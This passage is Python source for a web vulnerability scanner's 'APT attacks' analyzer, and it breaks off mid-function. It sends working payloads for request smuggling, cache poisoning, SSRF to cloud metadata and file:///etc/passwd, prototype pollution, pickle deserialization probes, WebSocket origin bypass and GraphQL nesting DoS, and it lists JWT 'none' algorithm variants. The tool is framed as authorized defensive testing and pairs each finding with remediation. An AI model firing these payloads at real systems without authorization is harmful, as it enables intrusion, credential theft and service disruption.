"""
APT-Level Attack Patterns Analyzer for SecureProbe.

Implements advanced persistent threat (APT) level attack patterns for
defensive security testing. These patterns simulate nation-state level
attack techniques to help organizations test their defenses BEFORE
actual attacks occur.

This module is designed for authorized security testing only.
All tests require explicit scan_mode='active' to execute.

Attack Patterns:
1. HTTP Request Smuggling (CL.TE / TE.CL desync)
2. Cache Poisoning (CDN/proxy cache attacks)
3. SSRF Chain Detection (metadata endpoints, internal IPs)
4. Prototype Pollution (__proto__, constructor.prototype)
5. Deserialization Probes (Java/PHP/Python magic bytes)
6. WebSocket Hijacking (CSWSH, Origin validation)
7. GraphQL Introspection Abuse (schema enumeration, DoS)
8. JWT Key Confusion (algorithm switching, null signature)
9. HTTP/2 Smuggling (H2.CL, H2.TE vectors)
10. DNS Rebinding Detection (Host validation, CORS)
"""

from __future__ import annotations

import base64
import hashlib
import json
import os
import re
import sys
from pathlib import Path
from typing import Any
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx
import jwt
import structlog
from dotenv import load_dotenv

# Add python-sdk to path for owl_browser imports before loading local modules
sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent / "python-sdk"))

# Load environment variables
load_dotenv()

from secureprobe.analyzers.base import BaseAnalyzer  # noqa: E402
from secureprobe.models import AnalyzerType, Finding, Severity  # noqa: E402
from secureprobe.utils import safe_response_text  # noqa: E402

logger = structlog.get_logger(__name__)


def _get_browser_instance() -> Any:
    """
    Create a Browser instance with remote URL configuration if available.

    Loads OWL_BROWSER_URL and OWL_BROWSER_TOKEN from environment.
    Falls back to local browser if no remote configuration is present.

    Returns:
        Configured Browser instance
    """
    from owl_browser import Browser, RemoteConfig

    remote_url = os.getenv("OWL_BROWSER_URL")
    remote_token = os.getenv("OWL_BROWSER_TOKEN")

    if remote_url and remote_token:
        logger.debug(
            "apt_analyzer_using_remote_browser",
            remote_url=remote_url,
            has_token=bool(remote_token),
        )
        remote_config = RemoteConfig(url=remote_url, token=remote_token)
        return Browser(remote=remote_config)
    else:
        logger.debug("apt_analyzer_using_local_browser")
        return Browser()


class APTAttacksAnalyzer(BaseAnalyzer):
    """
    Analyzer implementing APT-level attack patterns.

    These patterns simulate advanced persistent threat (APT) techniques
    used by nation-state hackers. Businesses need to test against these
    sophisticated attacks BEFORE they occur.

    Attack Patterns:
    1. HTTP Request Smuggling - CL.TE/TE.CL desync attacks
    2. Cache Poisoning - CDN/proxy cache injection
    3. SSRF Chain Detection - Internal IP and metadata access
    4. Prototype Pollution - JavaScript object prototype attacks
    5. Deserialization Probes - Magic byte fingerprinting
    6. WebSocket Hijacking - CSWSH and Origin validation
    7. GraphQL Introspection - Schema enumeration and DoS
    8. JWT Key Confusion - Algorithm switching attacks
    9. HTTP/2 Smuggling - H2.CL and H2.TE vectors
    10. DNS Rebinding Detection - Host validation bypass
    """

    analyzer_type = AnalyzerType.APT_ATTACKS

    # SSRF target IPs for testing
    SSRF_TARGETS: list[tuple[str, str]] = [
        ("http://169.254.169.254/latest/meta-data/", "AWS EC2 Metadata"),
        ("http://metadata.google.internal/computeMetadata/v1/", "GCP Metadata"),
        ("http://169.254.169.254/metadata/instance", "Azure Metadata"),
        ("http://127.0.0.1:80/", "Localhost HTTP"),
        ("http://127.0.0.1:8080/", "Localhost 8080"),
        ("http://127.0.0.1:443/", "Localhost HTTPS port"),
        ("http://localhost/admin", "Localhost Admin"),
        ("http://[::1]/", "IPv6 Localhost"),
        ("http://0.0.0.0/", "Zero IP"),
        ("http://10.0.0.1/", "Private 10.x Range"),
        ("http://172.16.0.1/", "Private 172.x Range"),
        ("http://192.168.1.1/", "Private 192.168 Range"),
        ("http://169.254.169.254/openstack/latest/meta_data.json", "OpenStack Metadata"),
        ("http://169.254.169.254/latest/user-data", "AWS User Data"),
        ("file:///etc/passwd", "Local File Read"),
        ("dict://127.0.0.1:6379/info", "Redis via DICT"),
        ("gopher://127.0.0.1:6379/_INFO", "Redis via Gopher"),
    ]

    # Cache poisoning headers - use unique markers to avoid false positives
    # Common values like "443" or "https" appear naturally on pages and cause false positives
    CACHE_POISON_HEADERS: list[tuple[str, str, str]] = [
        ("X-Forwarded-Host", "sprobe-evil-7x9k2m.com", "X-Forwarded-Host injection"),
        ("X-Forwarded-Scheme", "sprobe-scheme-4n8p1q", "Scheme override"),
        ("X-Original-URL", "/sprobe-admin-3j7r5w", "Original URL override"),
        ("X-Rewrite-URL", "/sprobe-rewrite-6m2k9x", "Rewrite URL override"),
        ("X-Host", "sprobe-host-8p4n2v.com", "X-Host injection"),
        ("X-Forwarded-Server", "sprobe-server-1k7m3q.com", "X-Forwarded-Server injection"),
        ("X-HTTP-Host-Override", "sprobe-override-5r9j2w.com", "Host override"),
        ("Forwarded", "host=sprobe-fwd-2m8k4p.com", "Forwarded header injection"),
        ("X-Forwarded-Port", "sprobe-port-9x3n7k", "Port override"),
        ("X-Forwarded-Proto", "sprobe-proto-4j6r1m", "Protocol override"),
    ]

    # Prototype pollution payloads
    PROTOTYPE_PAYLOADS: list[tuple[dict[str, Any], str]] = [
        ({"__proto__": {"admin": True}}, "__proto__ direct"),
        ({"constructor": {"prototype": {"admin": True}}}, "constructor.prototype"),
        ({"__proto__": {"isAdmin": True, "role": "admin"}}, "__proto__ role elevation"),
        ({"constructor": {"prototype": {"polluted": "true"}}}, "Pollution marker"),
        ({"__proto__": {"toString": "pwned"}}, "toString override"),
    ]

    # Deserialization magic bytes
    DESER_SIGNATURES: list[tuple[bytes, str, str]] = [
        (b"\xac\xed\x00\x05", "Java ObjectInputStream", "CWE-502"),
        (b"rO0AB", "Java Base64 serialized", "CWE-502"),
        (b"O:4:", "PHP serialize() object", "CWE-502"),
        (b"a:4:", "PHP serialize() array", "CWE-502"),
        (b"\x80\x04\x95", "Python pickle v4", "CWE-502"),
        (b"\x80\x03}", "Python pickle v3 dict", "CWE-502"),
        (b"cos\nsystem", "Python pickle RCE attempt", "CWE-502"),
    ]

    # GraphQL introspection query
    GRAPHQL_INTROSPECTION = """
    query IntrospectionQuery {
        __schema {
            types {
                name
                kind
                fields {
                    name
                    type { name }
                }
            }
            queryType { name }
            mutationType { name }
        }
    }
    """

    # GraphQL DoS payloads
    GRAPHQL_DOS_PAYLOADS: list[tuple[str, str]] = [
        # Deep nesting attack
        (
            '{"query": "{ __typename ' + "".join(["{__typename"] * 50) + "}" * 50 + '"}',
            "Deep nesting",
        ),
        # Alias-based batching
        (
            '{"query": "{ ' + " ".join([f"a{i}: __typename" for i in range(100)]) + ' }"}',
            "Alias batching",
        ),
    ]

    # JWT algorithm confusion payloads
    JWT_ALGORITHMS_TO_TEST: list[str] = ["HS256", "HS384", "HS512", "none", "None", "NONE", "nOnE"]

    # HTTP methods for smuggling tests
    HTTP_SMUGGLING_METHODS: list[str] = ["GET", "POST"]

    async def analyze(
        self,
        url: str,
        page_data: dict[str, Any],
    ) -> list[Finding]:
        """
        Execute APT-level attack patterns against the target.

        Args:
            url: Target URL
            page_data: Page data including HTML, forms, headers

        Returns:
            List of discovered findings
        """
        findings: list[Finding] = []
        scan_mode = page_data.get("scan_mode", "passive")

        # APT attacks are active-only - they involve sending malicious payloads
        if scan_mode != "active":
            logger.debug(
                "apt_attacks_skipped",
                reason="passive mode - APT attacks require active mode",
            )
            return findings

        html_content = page_data.get("html", "")
        headers = page_data.get("headers", {})
        cookies = page_data.get("cookies", [])

        # Execute all APT attack patterns
        findings.extend(await self._attack_http_smuggling(url, headers))
        findings.extend(await self._attack_cache_poisoning(url, headers, html_content))
        findings.extend(await self._attack_ssrf_detection(url, html_content))
        findings.extend(await self._attack_prototype_pollution(url))
        findings.extend(await self._attack_deserialization_probes(url, headers, html_content))
        findings.extend(await self._attack_websocket_hijacking(url))
        findings.extend(await self._attack_graphql_introspection(url))
        findings.extend(await self._attack_jwt_confusion(url, headers, cookies))
        findings.extend(await self._attack_http2_smuggling(url))
        findings.extend(await self._attack_dns_rebinding_detection(url, headers))

        return findings

    async def _attack_http_smuggling(
        self,
        url: str,
        headers: dict[str, str],
    ) -> list[Finding]:
        """
        Attack 1: HTTP Request Smuggling (CL.TE / TE.CL).

        Tests for desynchronization attacks where front-end and back-end
        servers interpret request boundaries differently.

        CWE-444: Inconsistent Interpretation of HTTP Requests
        """
        findings: list[Finding] = []

        # CL.TE payload: Content-Length takes precedence on front-end,
        # Transfer-Encoding on back-end
        cl_te_payloads = [
            # Basic CL.TE
            {
                "headers": {
                    "Content-Length": "6",
                    "Transfer-Encoding": "chunked",
                },
                "body": "0\r\n\r\nG",
                "name": "CL.TE Basic",
            },
            # CL.TE with obfuscated TE
            {
                "headers": {
                    "Content-Length": "6",
                    "Transfer-Encoding": " chunked",  # Leading space
                },
                "body": "0\r\n\r\nX",
                "name": "CL.TE Obfuscated Space",
            },
            # CL.TE with tab obfuscation
            {
                "headers": {
                    "Content-Length": "6",
                    "Transfer-Encoding": "\tchunked",
                },
                "body": "0\r\n\r\nX",
                "name": "CL.TE Obfuscated Tab",
            },
        ]

        # TE.CL payload: Transfer-Encoding takes precedence on front-end,
        # Content-Length on back-end
        te_cl_payloads = [
            {
                "headers": {
                    "Transfer-Encoding": "chunked",
                    "Content-Length": "4",
                },
                "body": "5c\r\nGPOST / HTTP/1.1\r\nContent-Type: x\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n",
                "name": "TE.CL Basic",
            },
        ]

        all_payloads = cl_te_payloads + te_cl_payloads

        for payload in all_payloads:
            try:
                # Use raw HTTP request to preserve exact headers
                parsed = urlparse(url)

                async with httpx.AsyncClient(
                    timeout=15.0,
                    verify=self.config.verify_ssl,
                    follow_redirects=False,  # Don't follow redirects for smuggling
                ) as client:
                    # Build headers with smuggling payload
                    test_headers = dict(payload["headers"])
                    test_headers["Host"] = parsed.netloc
                    test_headers["User-Agent"] = self.config.user_agent

                    response = await client.post(
                        url,
                        headers=test_headers,
                        content=payload["body"],
                    )

                    # Detect smuggling indicators
                    response_text = safe_response_text(response)
                    smuggling_indicators = [
                        response.status_code == 400,  # Bad request from desync
                        response.status_code == 403,  # Blocked smuggled request
                        "400 Bad Request" in response_text,
                        "Request Timeout" in response_text,
                        response.elapsed.total_seconds() > 10,  # Timeout from hung request
                    ]

                    # Check for response split
                    if "HTTP/" in response_text[100:]:  # Response within response
                        findings.append(
                            self._create_finding(
                                severity=Severity.CRITICAL,
                                title=f"HTTP Request Smuggling Detected: {payload['name']}",
                                description=(
                                    f"Server appears vulnerable to HTTP request smuggling via {payload['name']}. "
                                    "Response contains embedded HTTP response, indicating successful desync. "
                                    "This allows bypassing security controls, cache poisoning, and hijacking "
                                    "other users' requests."
                                ),
                                cwe_id="CWE-444",
                                cwe_name="Inconsistent Interpretation of HTTP Requests",
                                url=url,
                                evidence=f"Payload: {payload['name']}; Response contains nested HTTP",
                                remediation=(
                                    "Normalize HTTP handling: Use HTTP/2 end-to-end where possible. "
                                    "Configure front-end to reject ambiguous requests. "
                                    "Ensure Content-Length and Transfer-Encoding are never both present. "
                                    "Use same HTTP parser on all tiers."
                                ),
                                cvss_score=9.8,
                                references=[
                                    "https://portswigger.net/web-security/request-smuggling",
                                    "https://cwe.mitre.org/data/definitions/444.html",
                                ],
                                metadata={"payload_type": payload["name"]},
                            )
                        )
                        break  # Found critical vulnerability

                    # Differential response timing or errors might indicate partial vuln
                    if any(smuggling_indicators):
                        findings.append(
                            self._create_finding(
                                severity=Severity.HIGH,
                                title=f"Potential HTTP Smuggling Vector: {payload['name']}",
                                description=(
                                    f"Server shows anomalous behavior with {payload['name']} smuggling payload. "
                                    "Status code or timing suggests possible request desynchronization. "
                                    "Further manual testing recommended."
                                ),
                                cwe_id="CWE-444",
                                cwe_name="Inconsistent Interpretation of HTTP Requests",
                                url=url,
                                evidence=f"Status: {response.status_code}; Time: {response.elapsed.total_seconds():.2f}s",
                                remediation=(
                                    "Review request handling configuration. Ensure consistent parsing "
                                    "of Content-Length and Transfer-Encoding across all servers."
                                ),
                                cvss_score=8.1,
                                metadata={"payload_type": payload["name"], "status": response.status_code},
                            )
                        )

            except Exception as e:
                logger.debug("http_smuggling_test_error", payload=payload["name"], error=str(e))

        return findings

    async def _attack_cache_poisoning(
        self,
        url: str,
        headers: dict[str, str],
        original_html: str,
    ) -> list[Finding]:
        """
        Attack 2: Web Cache Poisoning.

        Injects malicious headers to poison CDN/proxy caches with
        modified responses that affect other users.

        CWE-444: Inconsistent Interpretation of HTTP Requests
        """
        findings: list[Finding] = []

        # Check for caching indicators in response
        cache_indicators = ["x-cache", "cf-cache-status", "x-varnish", "age", "x-cdn"]
        headers_lower = {k.lower() for k in headers}
        is_cached = any(h.lower() in headers_lower for h in cache_indicators)

        for header_name, header_value, description in self.CACHE_POISON_HEADERS:
            try:
                # Add cache buster to avoid polluting real cache
                cache_buster = hashlib.md5(f"{url}{header_name}".encode()).hexdigest()[:8]
                test_url = f"{url}{'&' if '?' in url else '?'}cb={cache_buster}"

                async with httpx.AsyncClient(
                    timeout=10.0,
                    verify=self.config.verify_ssl,
                    follow_redirects=True,
                ) as client:
                    # Request with poison header
                    poison_headers = {
                        header_name: header_value,
                        "User-Agent": self.config.user_agent,
                    }

                    response = await client.get(test_url, headers=poison_headers)

                    # Check if header value is reflected in response
                    value_reflected = header_value in safe_response_text(response)

                    # Check for redirect to poisoned host
                    redirect_poisoned = False
                    if response.history:
                        for hist in response.history:
                            if header_value in str(hist.headers.get("location", "")):
                                redirect_poisoned = True
                                break

                    # Check response headers for reflection
                    header_reflected = any(
                        header_value in str(v) for v in response.headers.values()
                    )

                    if value_reflected or redirect_poisoned or header_reflected:
                        severity = Severity.CRITICAL if is_cached else Severity.HIGH

                        findings.append(
                            self._create_finding(
                                severity=severity,
                                title=f"Cache Poisoning via {header_name}",
                                description=(
                                    f"Server reflects {header_name} header value in response. "
                                    f"Injection type: {description}. "
                                    f"{'Response is cached - this can affect ALL users!' if is_cached else 'Not cached, but still indicates header injection vulnerability.'}"
                                ),
                                cwe_id="CWE-444",
                                cwe_name="Inconsistent Interpretation of HTTP Requests",
                                url=url,
                                evidence=f"Header: {header_name}: {header_value}; Reflected: {'body' if value_reflected else 'redirect' if redirect_poisoned else 'headers'}",
                                remediation=(
                                    "Do not trust X-Forwarded-* headers without validation. "
                                    "Configure CDN/proxy to strip unknown headers. "
                                    "Use Vary header to prevent cache key collisions. "
                                    "Validate and sanitize all header values before use."
                                ),
                                cvss_score=9.1 if is_cached else 7.5,
                                references=[
                                    "https://portswigger.net/web-security/web-cache-poisoning",
                                    "https://cwe.mitre.org/data/definitions/444.html",
                                ],
                                metadata={
                                    "header": header_name,
                                    "value": header_value,
                                    "is_cached": is_cached,
                                    "reflection_type": "body" if value_reflected else "redirect" if redirect_poisoned else "headers",
                                },
                            )
                        )

            except Exception as e:
                logger.debug("cache_poisoning_test_error", header=header_name, error=str(e))

        return findings

    async def _attack_ssrf_detection(
        self,
        url: str,
        html_content: str,
    ) -> list[Finding]:
        """
        Attack 3: SSRF Chain Detection.

        Tests for Server-Side Request Forgery by injecting internal IPs
        and cloud metadata endpoints into URL parameters.

        CWE-918: Server-Side Request Forgery (SSRF)
        """
        findings: list[Finding] = []

        # Find URL parameters that might accept URLs
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # URL-like parameter names
        url_param_patterns = [
            r"url", r"uri", r"path", r"src", r"source", r"dest", r"destination",
            r"redirect", r"return", r"next", r"target", r"link", r"ref",
            r"callback", r"page", r"site", r"html", r"proxy", r"fetch",
            r"load", r"img", r"image", r"file", r"document", r"feed",
        ]

        # Also search HTML for hidden URL inputs
        input_pattern = r'<input[^>]*name=["\']?([^"\'>\s]+)["\']?[^>]*>'
        html_inputs = re.findall(input_pattern, html_content, re.IGNORECASE)

        # Combine URL params and form inputs
        test_params = list(params.keys()) + html_inputs

        vulnerable_params: list[tuple[str, str, str]] = []

        for param in test_params:
            param_lower = param.lower()
            is_url_param = any(re.search(p, param_lower) for p in url_param_patterns)

            if not is_url_param:
                continue

            # Test each SSRF target
            for ssrf_url, ssrf_desc in self.SSRF_TARGETS[:5]:  # Limit to avoid abuse
                try:
                    # Build test URL with SSRF payload
                    test_params_dict = dict(params)
                    test_params_dict[param] = [ssrf_url]
                    test_query = urlencode(test_params_dict, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme,
                        parsed.netloc,
                        parsed.path,
                        "",
                        test_query,
                        "",
                    ))

                    async with httpx.AsyncClient(
                        timeout=10.0,
                        verify=self.config.verify_ssl,
                        follow_redirects=True,
                    ) as client:
                        response = await client.get(
                            test_url,
                            headers={"User-Agent": self.config.user_agent},
                        )

                        # Check for SSRF indicators
                        response_text = safe_response_text(response)
                        ssrf_indicators = [
                            # AWS metadata
                            "ami-id" in response_text,
                            "instance-id" in response_text,
                            "iam/security-credentials" in response_text,
                            # GCP metadata
                            "computeMetadata" in response_text,
                            # General indicators
                            "root:x:" in response_text,  # /etc/passwd
                            "localhost" in response_text.lower() and len(response_text) > 100,
                        ]

                        if any(ssrf_indicators):
                            vulnerable_params.append((param, ssrf_url, ssrf_desc))
                            break  # Found vuln for this param

                except Exception as e:
                    logger.debug("ssrf_test_error", param=param, target=ssrf_desc, error=str(e))

        # Report findings
        for param, target_url, target_desc in vulnerable_params:
            findings.append(
                self._create_finding(
                    severity=Severity.CRITICAL,
                    title=f"SSRF Vulnerability in Parameter: {param}",
                    description=(
                        f"Parameter '{param}' is vulnerable to Server-Side Request Forgery. "
                        f"Successfully accessed: {target_desc}. "
                        "This allows attackers to access internal services, cloud metadata, "
                        "and potentially pivot to internal network resources."
                    ),
                    cwe_id="CWE-918",
                    cwe_name="Server-Side Request Forgery (SSRF)",
                    url=url,
                    evidence=f"Parameter: {param}; Payload: {target_url}",
                    remediation=(
                        "Validate and sanitize all URL inputs. Use allowlists for permitted domains. "
                        "Block access to internal IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x). "
                        "Disable unnecessary URL schemes (file://, gopher://, dict://). "
                        "Use network segmentation to limit SSRF impact."
                    ),
                    cvss_score=9.8,
                    references=[
                        "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
                        "https://cwe.mitre.org/data/definitions/918.html",
                    ],
                    metadata={
                        "parameter": param,
                        "ssrf_target": target_url,
                        "target_description": target_desc,
                    },
                )
            )

        return findings

    async def _attack_prototype_pollution(
        self,
        url: str,
    ) -> list[Finding]:
        """
        Attack 4: Prototype Pollution.

        Injects __proto__ and constructor.prototype payloads to pollute
        JavaScript object prototypes via JSON endpoints.

        CWE-1321: Improperly Controlled Modification of Object Prototype Attributes
        """
        findings: list[Finding] = []

        for payload, payload_desc in self.PROTOTYPE_PAYLOADS:
            try:
                async with httpx.AsyncClient(
                    timeout=10.0,
                    verify=self.config.verify_ssl,
                    follow_redirects=True,
                ) as client:
                    # Try POST with JSON payload
                    response = await client.post(
                        url,
                        json=payload,
                        headers={
                            "User-Agent": self.config.user_agent,
                            "Content-Type": "application/json",
                        },
                    )

                    # Check for pollution indicators
                    response_text = safe_response_text(response)
                    pollution_indicators = [
                        # Payload reflected back (merged into response)
                        "__proto__" in response_text,
                        "constructor" in response_text and "prototype" in response_text,
                        # Server accepted without error
                        response.status_code in [200, 201] and "admin" in response_text.lower(),
                        # Unexpected privilege escalation
                        "isAdmin" in response_text,
                    ]

                    # Check if server accepted the payload
                    if response.status_code in [200, 201, 204]:
                        # Try a follow-up request to see if pollution persisted
                        followup = await client.get(
                            url,
                            headers={"User-Agent": self.config.user_agent},
                        )

                        if any(pollution_indicators) or "polluted" in safe_response_text(followup):
                            findings.append(
                                self._create_finding(
                                    severity=Severity.HIGH,
                                    title=f"Prototype Pollution Accepted: {payload_desc}",
                                    description=(
                                        f"Server accepted prototype pollution payload via {payload_desc}. "
                                        "If this pollutes server-side JavaScript objects, it can lead to "
                                        "privilege escalation, RCE, or denial of service."
                                    ),
                                    cwe_id="CWE-1321",
                                    cwe_name="Improperly Controlled Modification of Object Prototype Attributes",
                                    url=url,
                                    evidence=f"Payload: {json.dumps(payload)}; Status: {response.status_code}",
                                    remediation=(
                                        "Sanitize JSON input to remove __proto__ and constructor keys. "
                                        "Use Object.create(null) for safe dictionaries. "
                                        "Freeze Object.prototype to prevent modification. "
                                        "Use schema validation to reject unexpected properties."
                                    ),
                                    cvss_score=8.1,
                                    references=[
                                        "https://portswigger.net/web-security/prototype-pollution",
                                        "https://cwe.mitre.org/data/definitions/1321.html",
                                    ],
                                    metadata={"payload": payload, "payload_type": payload_desc},
                                )
                            )
                            break

            except Exception as e:
                logger.debug("prototype_pollution_test_error", payload=payload_desc, error=str(e))

        return findings

    async def _attack_deserialization_probes(
        self,
        url: str,
        headers: dict[str, str],
        html_content: str,
    ) -> list[Finding]:
        """
        Attack 5: Deserialization Probes.

        Detects deserialization endpoints via magic bytes and error fingerprinting.

        CWE-502: Deserialization of Untrusted Data
        """
        findings: list[Finding] = []

        # Check for indicators of deserialization endpoints
        # Patterns are designed to match actual code contexts, not documentation text
        deser_indicators = [
            (r"name=[\"']?__VIEWSTATE", "ASP.NET ViewState Field", "CWE-502"),
            (r"<input[^>]*viewstate", "ASP.NET ViewState Input", "CWE-502"),
            (r"javax\.faces\.ViewState", "JSF ViewState", "CWE-502"),
            (r"href=[\"'][^\"']*\.ser\b", "Serialized Object Extension", "CWE-502"),
            # Python pickle: match import statements and method calls, not plain text
            (r"(?:import\s+pickle|pickle\.(?:loads?|dumps?|Unpickler)|__reduce(?:_ex)?__)", "Python Pickle Code", "CWE-502"),
            # Ruby marshal: match actual Marshal calls
            (r"Marshal\.(?:load|dump|restore)", "Ruby Marshal Code", "CWE-502"),
            # PHP serialize: match function calls, not documentation
            (r"(?:unserialize|serialize)\s*\(", "PHP Serialization Function", "CWE-502"),
            # Java: match actual class usage patterns
            (r"(?:new\s+ObjectInputStream|ObjectInputStream\s*\(|\.readObject\s*\()", "Java Deserialization", "CWE-502"),
        ]

        # Check HTML for deserialization indicators
        for pattern, indicator_name, cwe in deser_indicators:
            if re.search(pattern, html_content, re.IGNORECASE):
                findings.append(
                    self._create_finding(
                        severity=Severity.MEDIUM,
                        title=f"Deserialization Indicator: {indicator_name}",
                        description=(
                            f"Page contains reference to {indicator_name}. "
                            "This may indicate use of unsafe deserialization that could "
                            "lead to remote code execution if exploited."
                        ),
                        cwe_id=cwe,
                        cwe_name="Deserialization of Untrusted Data",
                        url=url,
                        evidence=f"Pattern: {pattern}",
                        remediation=(
                            "Avoid deserializing untrusted data. Use safe serialization formats "
                            "(JSON, Protocol Buffers). Implement integrity checks. "
                            "Use deserialization filtering (JEP 290 for Java)."
                        ),
                        cvss_score=6.5,
                        metadata={"indicator": indicator_name, "pattern": pattern},
                    )
                )

        # Test endpoints with serialized payloads
        for magic_bytes, format_name, cwe in self.DESER_SIGNATURES:
            try:
                async with httpx.AsyncClient(
                    timeout=10.0,
                    verify=self.config.verify_ssl,
                    follow_redirects=True,
                ) as client:
                    # Send magic bytes to see server response
                    response = await client.post(
                        url,
                        content=magic_bytes,
                        headers={
                            "User-Agent": self.config.user_agent,
                            "Content-Type": "application/octet-stream",
                        },
                    )

                    # Check for deserialization error indicators
                    error_indicators = [
                        "InvalidClassException",
                        "ClassNotFoundException",
                        "SerializationException",
                        "UnpicklingError",
                        "unserialize",
                        "invalid stream header",
                        "Unexpected token",
                        "cannot be cast",
                    ]

                    response_lower = safe_response_text(response).lower()
                    for indicator in error_indicators:
                        if indicator.lower() in response_lower:
                            findings.append(
                                self._create_finding(
                                    severity=Severity.HIGH,
                                    title=f"Deserialization Endpoint Detected: {format_name}",
                                    description=(
                                        f"Server processes {format_name} format and returned "
                                        f"deserialization error: '{indicator}'. This confirms the "
                                        "endpoint deserializes input and may be vulnerable to RCE."
                                    ),
                                    cwe_id=cwe,
                                    cwe_name="Deserialization of Untrusted Data",
                                    url=url,
                                    evidence=f"Format: {format_name}; Error indicator: {indicator}",
                                    remediation=(
                                        "CRITICAL: Review deserialization usage immediately. "
                                        "Replace with safe formats. Implement type checking "
                                        "before deserialization. Consider input validation."
                                    ),
                                    cvss_score=9.1,
                                    references=[
                                        "https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data",
                                    ],
                                    metadata={"format": format_name, "error": indicator},
                                )
                            )
                            break

            except Exception as e:
                logger.debug("deserialization_test_error", format=format_name, error=str(e))

        return findings

    async def _attack_websocket_hijacking(
        self,
        url: str,
    ) -> list[Finding]:
        """
        Attack 6: WebSocket Hijacking (CSWSH).

        Tests for missing Origin validation in WebSocket endpoints
        that could enable Cross-Site WebSocket Hijacking.

        CWE-1385: Missing Origin Validation in WebSockets
        """
        findings: list[Finding] = []

        # Derive WebSocket URL
        parsed = urlparse(url)
        ws_scheme = "wss" if parsed.scheme == "https" else "ws"

        # Common WebSocket paths
        ws_paths = [
            "/ws", "/websocket", "/socket", "/socket.io/",
            "/sockjs/", "/realtime", "/live", "/stream",
            "/api/ws", "/api/websocket", "/events",
        ]

        for ws_path in ws_paths:
            ws_url = f"{ws_scheme}://{parsed.netloc}{ws_path}"

            try:
                # Use httpx for the upgrade request
                async with httpx.AsyncClient(
                    timeout=10.0,
                    verify=self.config.verify_ssl,
                ) as client:
                    # Send WebSocket upgrade request with malicious Origin
                    upgrade_headers = {
                        "User-Agent": self.config.user_agent,
                        "Upgrade": "websocket",
                        "Connection": "Upgrade",
                        "Sec-WebSocket-Key": base64.b64encode(os.urandom(16)).decode(),
                        "Sec-WebSocket-Version": "13",
                        "Origin": "https://evil-attacker.com",  # Malicious origin
                    }

                    response = await client.get(
                        url + ws_path.lstrip("/"),
                        headers=upgrade_headers,
                    )

                    # Check if upgrade was accepted despite bad origin
                    if response.status_code == 101:  # Switching Protocols
                        findings.append(
                            self._create_finding(
                                severity=Severity.HIGH,
                                title=f"WebSocket Origin Bypass: {ws_path}",
                                description=(
                                    f"WebSocket endpoint at {ws_path} accepts connections from "
                                    "arbitrary Origins (tested with evil-attacker.com). "
                                    "This enables Cross-Site WebSocket Hijacking (CSWSH)."
                                ),
                                cwe_id="CWE-1385",
                                cwe_name="Missing Origin Validation in WebSockets",
                                url=ws_url,
                                evidence="Accepted malicious Origin; Status: 101 Switching Protocols",
                                remediation=(
                                    "Validate Origin header on all WebSocket connections. "
                                    "Maintain allowlist of permitted origins. "
                                    "Use CSRF tokens in WebSocket handshake. "
                                    "Implement authentication for WebSocket connections."
                                ),
                                cvss_score=8.1,
                                references=[
                                    "https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking",
                                ],
                                metadata={"websocket_path": ws_path},
                            )
                        )
                    elif response.status_code == 200 and "websocket" in safe_response_text(response).lower():
                        # WebSocket endpoint exists
                        findings.append(
                            self._create_finding(
                                severity=Severity.LOW,
                                title=f"WebSocket Endpoint Discovered: {ws_path}",
                                description=(
                                    f"WebSocket endpoint found at {ws_path}. "
                                    "Manual testing recommended to verify Origin validation."
                                ),
                                cwe_id="CWE-1385",
                                cwe_name="Missing Origin Validation in WebSockets",
                                url=ws_url,
                                evidence="WebSocket endpoint detected",
                                remediation="Verify Origin validation is properly implemented.",
                                cvss_score=3.1,
                                metadata={"websocket_path": ws_path},
                            )
                        )

            except Exception as e:
                logger.debug("websocket_test_error", path=ws_path, error=str(e))

        return findings

    async def _attack_graphql_introspection(
        self,
        url: str,
    ) -> list[Finding]:
        """
        Attack 7: GraphQL Introspection Abuse.

        Queries __schema for full API enumeration and tests for
        batching attacks and nested query DoS.

        CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
        """
        findings: list[Finding] = []

        # Common GraphQL endpoints
        graphql_paths = ["/graphql", "/api/graphql", "/v1/graphql", "/query", "/gql"]

        for gql_path in graphql_paths:
            gql_url = f"{url.rstrip('/')}{gql_path}"

            try:
                async with httpx.AsyncClient(
                    timeout=15.0,
                    verify=self.config.verify_ssl,
                    follow_redirects=True,
                ) as client:
                    # Test introspection query
                    introspection_payload = {
                        "query": self.GRAPHQL_INTROSPECTION,
                        "variables": {},
                    }

                    response = await client.post(
                        gql_url,
                        json=introspection_payload,
                        headers={
                            "User-Agent": self.config.user_agent,
                            "Content-Type": "application/json",
                        },
                    )

                    if response.status_code == 200:
                        try:
                            data = response.json()
                            if "data" in data and "__schema" in str(data):
                                # Count types for evidence
                                types_count = 0
                                if "data" in data and data["data"]:
                                    schema = data["data"].get("__schema", {})
                                    types_count = len(schema.get("types", []))

                                findings.append(
                                    self._create_finding(
                                        severity=Severity.MEDIUM,
                                        title=f"GraphQL Introspection Enabled: {gql_path}",
                                        description=(
                                            f"GraphQL endpoint at {gql_path} allows introspection queries. "
                                            f"Discovered {types_count} types in schema. "
                                            "This exposes the entire API structure to attackers."
                                        ),
                                        cwe_id="CWE-200",
                                        cwe_name="Exposure of Sensitive Information to an Unauthorized Actor",
                                        url=gql_url,
                                        evidence=f"Introspection returned {types_count} types",
                                        remediation=(
                                            "Disable introspection in production. "
                                            "Use: schema.introspection = false (Apollo) or "
                                            "disable_introspection (graphql-core). "
                                            "Implement query depth limiting and complexity analysis."
                                        ),
                                        cvss_score=5.3,
                                        references=[
                                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL",
                                        ],
                                        metadata={
                                            "endpoint": gql_path,
                                            "types_discovered": types_count,
                                        },
                                    )
                                )

                                # Test for DoS via nested queries
                                for dos_payload, dos_desc in self.GRAPHQL_DOS_PAYLOADS:
                                    try:
                                        dos_response = await client.post(
                                            gql_url,
                                            content=dos_payload,
                                            headers={
                                                "User-Agent": self.config.user_agent,
                                                "Content-Type": "application/json",
                                            },
                                            timeout=5.0,  # Short timeout for DoS test
                                        )

                                        if dos_response.status_code == 200:
                                            findings.append(
                                                self._create_finding(
